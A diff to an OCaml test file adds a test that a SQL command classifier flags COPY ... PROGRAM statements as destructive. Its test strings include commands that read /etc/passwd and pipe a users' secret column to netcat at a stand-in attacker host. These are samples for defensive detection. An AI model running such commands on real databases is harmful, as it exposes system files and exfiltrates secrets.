@@ -82,6 +82,14 @@ let test_cte_destructive_is_detected () =
     "WITH moved AS (DELETE FROM t WHERE old RETURNING id) SELECT * FROM moved"
 ;;
 
+let test_copy_program_destructive_is_detected () =
+  destructive "copy from program" "COPY logs FROM PROGRAM 'cat /etc/passwd'";
+  destructive "copy to program" "COPY (SELECT secret FROM users) TO PROGRAM 'nc attacker 4444'";
+  not_destructive "copy from stdin" "COPY logs FROM STDIN";
+  not_destructive "copy to stdout" "COPY logs TO STDOUT";
+  not_destructive "read identifiers named copy/program" "SELECT copy FROM program"
+;;
+
 let test_unknown_and_empty () =
   (match Db_op.of_command "" with
    | Error `Empty -> ()
@@ -107,6 +115,10 @@ let () =
             test_destructive_words_inside_literals_or_comments_do_not_floor
         ; Alcotest.test_case "reads/mutations not destructive" `Quick test_reads_and_mutations_not_destructive
         ; Alcotest.test_case "CTE destructive is detected" `Quick test_cte_destructive_is_detected
+        ; Alcotest.test_case
+            "COPY PROGRAM destructive is detected"
+            `Quick
+            test_copy_program_destructive_is_detected
         ; Alcotest.test_case "unknown and empty" `Quick test_unknown_and_empty
         ] )
     ]
